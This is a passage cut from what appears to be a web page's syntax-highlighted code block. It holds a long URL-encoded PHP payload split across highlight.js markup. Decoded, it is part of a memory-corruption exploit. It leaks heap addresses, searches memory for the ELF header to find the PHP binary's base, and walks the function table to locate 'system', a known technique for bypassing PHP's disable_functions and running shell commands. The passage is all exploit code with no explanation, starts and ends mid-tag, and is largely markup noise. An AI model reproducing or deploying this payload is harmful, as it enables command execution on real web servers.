class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">37</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">34</span>%<span class="hljs-number">35</span>%<span class="hljs-number">37</span>%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">36</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span 